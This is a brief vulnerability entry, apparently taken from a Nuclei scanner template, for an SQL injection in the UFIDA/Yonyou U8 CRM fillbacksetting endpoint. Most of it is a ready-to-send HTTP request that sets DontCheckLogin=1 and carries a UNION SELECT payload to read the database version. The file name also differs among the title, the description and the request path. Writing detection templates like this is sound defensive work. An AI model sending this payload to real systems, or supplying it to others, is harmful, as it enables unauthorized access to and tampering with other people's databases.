# Vulnerability: UFIDA U8 CRM cfillbacksetting.php - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`yonyou-u8-crm-sqli.yaml`)

## Description
UFIDA U8-CRM system /config/fillbacksetting.php contains an SQL injection vulnerability, which allows attackers to manipulate the database through maliciously constructed SQL statements, resulting in data leaks, tampering or destruction, and seriously threatening system security.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+ HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=bgsesstimeout-;
```

